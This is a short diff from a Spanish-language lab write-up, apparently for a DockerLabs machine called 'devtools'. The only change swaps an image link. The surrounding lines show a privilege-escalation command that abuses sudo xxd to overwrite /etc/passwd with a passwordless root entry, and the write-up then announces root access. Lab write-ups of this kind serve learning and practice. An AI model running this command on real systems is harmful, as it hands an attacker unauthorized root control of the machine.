@@ -46,6 +46,6 @@ buscando como tirar ese comando encontré este comando para borrar la "x" de "/e
 
      echo root::0:0:root:/root:/bin/bash | sudo xxd | sudo xxd -r - "/etc/passwd"
 
-![[dockerlabs/medio/devtools/root.png]]
+![image](https://github.com/user-attachments/assets/b1e42abe-387c-4ab5-a0f3-914968caf6a4)
 
 como vemos somos root!
